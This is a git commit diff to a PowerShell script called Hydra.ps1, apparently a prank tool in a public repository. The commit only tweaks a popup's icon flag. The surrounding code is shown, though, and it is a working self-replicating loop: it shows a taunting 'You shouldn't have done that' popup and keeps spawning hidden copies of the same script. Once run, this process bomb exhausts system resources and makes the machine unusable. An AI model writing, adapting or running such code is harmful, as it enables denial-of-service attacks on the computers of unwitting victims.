618c38e6934956040ffa622bcdde966f6d137bb1
Babyporkchop <93239527+Babyporkchop@users.noreply.github.com>
2023-08-22 22:15:02 +0800

    Update Hydra.ps1

--- Hydra/Hydra.ps1
+++ Hydra/Hydra.ps1
@@ -2,7 +2,7 @@
 $app = "cmd.exe"
 $wshell = New-Object -ComObject Wscript.Shell
 while ($true){
-$wshell.Popup("You shouldn't have done that",0,"Oh, no",0x1)
+$wshell.Popup("You shouldn't have done that",0,"Oh, no",0x1+0x30)
 Start-Process powershell.exe -Argumentlist "-file .\Hydra.ps1" -windowstyle hidden
 }
 }
